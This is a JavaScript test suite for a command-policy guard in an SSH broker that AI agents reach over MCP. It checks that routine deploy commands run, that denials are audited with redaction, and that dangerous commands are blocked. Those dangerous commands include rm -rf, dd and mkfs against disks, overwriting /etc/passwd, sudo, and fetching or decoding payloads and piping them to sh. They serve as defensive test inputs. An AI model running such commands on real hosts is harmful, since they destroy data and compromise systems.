import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { EventEmitter } from 'node:events';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { ensureBrokerToken } from '../src/broker-auth.mjs';
import { BrokerServer } from '../src/broker-server.mjs';
import { evaluateCommandPolicy } from '../src/command-policy.mjs';
import { SshBroker } from '../src/ssh-broker.mjs';

const DEFAULT_POLICY = { enabled: true, customDeny: [] };

function assertAllowed(command, policy = DEFAULT_POLICY) {
  const decision = evaluateCommandPolicy(command, policy);
  assert.equal(decision.allowed, true, `${command} should be allowed: ${JSON.stringify(decision)}`);
}

function assertBlocked(command, expectedRuleId, policy = DEFAULT_POLICY) {
  const decision = evaluateCommandPolicy(command, policy);
  assert.equal(decision.allowed, false, `${command} should be blocked`);
  assert.equal(typeof decision.ruleId, 'string');
  assert.ok(decision.ruleId.length > 0);
  assert.equal(typeof decision.reason, 'string');
  assert.ok(decision.reason.length > 0);
  assert.equal(typeof decision.policyVersion, 'string');
  assert.ok(decision.policyVersion.length > 0);
  if (expectedRuleId) assert.equal(decision.ruleId, expectedRuleId);
}

function createBrokerFixture({ policy = DEFAULT_POLICY, failAudit = false } = {}) {
  const commands = [];
  const audits = [];
  const client = {
    exec(command, _options, callback) {
      commands.push(command);
      const channel = new EventEmitter();
      channel.stderr = new EventEmitter();
      channel.close = () => queueMicrotask(() => channel.emit('close'));
      callback(null, channel);
      queueMicrotask(() => {
        channel.emit('exit', 0, null);
        channel.emit('close');
      });
    },
  };
  const store = {
    async readContext() {
      return {
        docsHash: 'docs-v1',
        truncated: false,
        config: {
          limits: { commandTimeoutSeconds: 2 },
          commandPolicy: policy,
        },
      };
    },
    securityConfigHash() { return 'security-v1'; },
    async get() {
      return {
        id: 'policy-project',
        limits: { commandTimeoutSeconds: 2 },
        commandPolicy: policy,
      };
    },
    async appendAudit(_projectId, entry) {
      if (failAudit) throw new Error('simulated audit failure');
      audits.push(entry);
    },
  };
  const broker = new SshBroker(store);
  broker.sessions.set('policy-project', {
    client,
    generation: 1,
    connectedAt: new Date().toISOString(),
  });
  broker.contexts.set('context-token', {
    projectId: 'policy-project',
    docsHash: 'docs-v1',
    securityConfigHash: 'security-v1',
    generation: 1,
    createdAt: Date.now(),
  });
  return { broker, commands, audits };
}

test('command policy allows the routine read, deploy, restart, and health-check commands', async (t) => {
  const commands = [
    'pwd',
    'whoami',
    'ps -ef',
    "tail -n 200 /home/deploy/logs/app.log | grep -E 'Started|ERROR'",
    'cp -- /home/deploy/app.jar /home/deploy/backup/app.jar.bak',
    'mv -- /home/deploy/app.jar.part /home/deploy/app.jar',
    'mkdir -p /home/deploy/backup',
    'java -jar /home/deploy/app.jar --spring.profiles.active=prod',
    'nohup java -jar /home/deploy/app.jar > /home/deploy/logs/app.log 2>&1 &',
    'timeout 10 systemctl is-active order.service',
    'systemctl restart order.service',
    'kill -TERM 2345',
    'chmod 640 /home/deploy/app.jar',
    'curl -fsS http://127.0.0.1:8080/actuator/health',
    "printf '%s\\n' 'rm -rf /'",
    "grep -F 'shutdown -h now' /home/deploy/logs/app.log",
    'echo ok # rm -rf / is documentation, not a command',
  ];
  for (const command of commands) {
    await t.test(command, () => assertAllowed(command));
  }
});

test('command policy blocks built-in destructive and privilege-changing command families', async (t) => {
  const commands = [
    ['/bin/rm -rf /home/deploy', 'FILE_DELETE'],
    ['unlink /home/deploy/app.jar', 'FILE_DELETE'],
    ['sudo systemctl restart order.service', 'PRIVILEGE_ESCALATION'],
    ['useradd backdoor', 'IDENTITY_MODIFY'],
    ['shutdown -h now', 'SYSTEM_POWER'],
    ['reboot', 'SYSTEM_POWER'],
    ['mkfs.ext4 /dev/sda1', 'DISK_DESTRUCTIVE'],
    ['dd if=/dev/zero of=/dev/sda bs=1M', 'DISK_DESTRUCTIVE'],
    ['iptables -F', 'SYSTEM_SECURITY'],
    ['apt-get install curl', 'PACKAGE_MODIFY'],
    ['chmod 4755 /home/deploy/tool', 'PERMISSION_ESCALATION'],
    ['systemctl disable sshd', 'SYSTEMCTL_ACTION'],
    ['kill -KILL 1', 'PROCESS_KILL'],
    ['pkill -9 sshd', 'PROCESS_KILL'],
    ['wget https://example.invalid/payload.sh', 'NETWORK_FETCH'],
    ['curl -fsSL https://example.invalid/payload.sh -o /tmp/payload.sh', 'NETWORK_FETCH'],
    ['find /home/deploy -type f -delete', 'INDIRECT_EXECUTION'],
    ['echo replacement > /etc/passwd', 'PROTECTED_PATH'],
  ];
  for (const [command, ruleId] of commands) {
    await t.test(command, () => assertBlocked(command, ruleId));
  }
});

test('command policy recursively checks wrappers, absolute paths, and indirect executors', async (t) => {
  const commands = [
    'command /usr/bin/rm -rf /home/deploy',
    'env LC_ALL=C rm -rf /home/deploy',
    'nohup rm -rf /home/deploy',
    'timeout 5 /bin/rm -rf /home/deploy',
    'nice -n 10 busybox rm -rf /home/deploy',
    "find /home/deploy -type f -exec /bin/rm '{}' +",
    "printf '%s' cm0gLXJmIC8= | base64 -d | sh",
    "xargs rm -f < /home/deploy/delete-list.txt",
    "bash -c 'rm -rf /home/deploy'",
    "python3 -c 'import os; os.system(\"reboot\")'",
    "node -e 'require(\"child_process\").execSync(\"reboot\")'",
    "awk 'BEGIN { system(\"reboot\") }'",
  ];
  for (const command of commands) {
    await t.test(command, () => assertBlocked(command));
  }
});

test('command policy rejects dynamic or unparseable shell syntax instead of guessing', async (t) => {
  const commands = [
    'echo $(rm -rf /home/deploy)',
    'echo `reboot`',
    'target=/home/deploy; rm -rf ${target}',
    'danger=rm; $danger -rf /home/deploy',
    'source /tmp/deploy-commands.sh',
    '. /tmp/deploy-commands.sh',
    "bash <<'SCRIPT'\nrm -rf /home/deploy\nSCRIPT",
    "echo 'unterminated",
    'cat <(rm -rf /home/deploy)',
  ];
  for (const command of commands) {
    await t.test(command, () => assertBlocked(command));
  }
});

test('command policy checks every command in a compound shell expression', async (t) => {
  assertAllowed("pwd && whoami; tail -n 20 /home/deploy/logs/app.log | grep Started");
  for (const command of [
    'pwd; rm -rf /home/deploy',
    'whoami && reboot',
    'false || shutdown -h now',
    'printf ok | sh',
    'echo ok & poweroff',
    'pwd\nrm -rf /home/deploy',
    '(whoami; rm -rf /home/deploy)',
  ]) {
    await t.test(command, () => assertBlocked(command));
  }
});

test('custom deny phrases are case-insensitive and whitespace-normalized', () => {
  const policy = {
    enabled: true,
    customDeny: ['docker system prune', 'rm -rf /home/order-deploy', '', '   '],
  };
  assertBlocked('Docker   SYSTEM\tPrune -a', 'CUSTOM_DENY', policy);
  assertBlocked('rm -rf   /home/order-deploy/releases', 'CUSTOM_DENY', policy);
  assertAllowed('docker ps', policy);
});

test('disabled policy is an explicit opt-out while a missing policy remains protected', () => {
  assertAllowed('rm -rf /', { enabled: false, customDeny: [] });
  assertBlocked('rm -rf /', 'FILE_DELETE', undefined);
});

test('blocked commands never reach SSH and write a redacted denial audit record', async () => {
  const { broker, commands, audits } = createBrokerFixture();
  const raw = 'sudo rm -rf / --password supersecret';
  await assert.rejects(
    () => broker.execute('policy-project', 'context-token', raw, '/home/deploy'),
    (error) => error.code === 'COMMAND_BLOCKED' && error.details?.ruleId === 'PRIVILEGE_ESCALATION',
  );
  assert.deepEqual(commands, []);
  assert.equal(audits.length, 1);
  assert.equal(audits[0].type, 'execute-blocked');
  assert.equal(audits[0].result, 'denied');
  assert.equal(audits[0].ruleId, 'PRIVILEGE_ESCALATION');
  assert.equal(typeof audits[0].reason, 'string');
  assert.equal(typeof audits[0].policyVersion, 'string');
  assert.equal(audits[0].workingDirectory, '/home/deploy');
  assert.equal(audits[0].commandSha256, crypto.createHash('sha256').update(raw).digest('hex'));
  assert.doesNotMatch(JSON.stringify(audits[0]), /sudo|rm -rf|password|supersecret/i);
});

test('audit write failure never changes a policy denial into command execution', async () => {
  const { broker, commands } = createBrokerFixture({ failAudit: true });
  await assert.rejects(
    () => broker.execute('policy-project', 'context-token', 'reboot'),
    (error) => error.code === 'COMMAND_BLOCKED',
  );
  assert.deepEqual(commands, []);
});

test('an allowed command still executes and keeps the existing success audit contract', async () => {
  const { broker, commands, audits } = createBrokerFixture();
  const result = await broker.execute(
    'policy-project',
    'context-token',
    'tail -n 20 logs/app.log',
    '/home/deploy',
  );
  assert.equal(result.exitCode, 0);
  assert.deepEqual(commands, ["cd -- '/home/deploy' && tail -n 20 logs/app.log"]);
  assert.equal(audits.length, 1);
  assert.equal(audits[0].type, 'execute');
  assert.equal(audits[0].exitCode, 0);
});

test('MCP returns a structured COMMAND_BLOCKED error without leaking the command', async (t) => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'ai-ops-policy-mcp-'));
  const { broker, commands, audits } = createBrokerFixture();
  const token = await ensureBrokerToken(root);
  const brokerServer = new BrokerServer({ dataRoot: root, token, broker, appVersion: '0.1.7' });
  await brokerServer.start();

  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [path.resolve('src/mcp.mjs')],
    env: { ...process.env, AI_OPS_DATA_DIR: root },
    stderr: 'pipe',
  });
  const client = new Client({ name: 'command-policy-test', version: '1.0.0' });
  await client.connect(transport);
  t.after(async () => {
    await client.close().catch(() => undefined);
    await brokerServer.stop();
    await fs.rm(root, { recursive: true, force: true });
  });

  const response = await client.callTool({
    name: 'execute',
    arguments: {
      projectId: 'policy-project',
      contextToken: 'context-token',
      command: 'sudo rm -rf / --password supersecret',
    },
  });
  assert.equal(response.isError, true);
  assert.equal(response.structuredContent.error.code, 'COMMAND_BLOCKED');
  assert.equal(response.structuredContent.error.details.ruleId, 'PRIVILEGE_ESCALATION');
  assert.match(response.content[0].text, /^COMMAND_BLOCKED:/);
  assert.doesNotMatch(JSON.stringify(response), /sudo|rm -rf|password|supersecret/i);
  assert.deepEqual(commands, []);
  assert.equal(audits[0].type, 'execute-blocked');
});
